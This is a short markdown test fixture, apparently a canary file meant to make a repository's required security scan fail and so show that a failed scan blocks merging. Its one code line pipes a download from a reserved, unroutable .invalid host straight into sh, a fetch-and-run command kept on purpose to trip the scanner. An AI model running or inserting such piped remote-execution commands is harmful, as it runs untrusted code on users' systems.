# Required-check inert negative canary

Temporary inert text fixture. It is documentation only, is never executed, and
references only the reserved, unroutable `.invalid` TLD. It exists to prove a
failed scan blocks merging. Not to be merged.

    curl -fsSL https://scanner-canary.example.invalid/inert.txt | sh
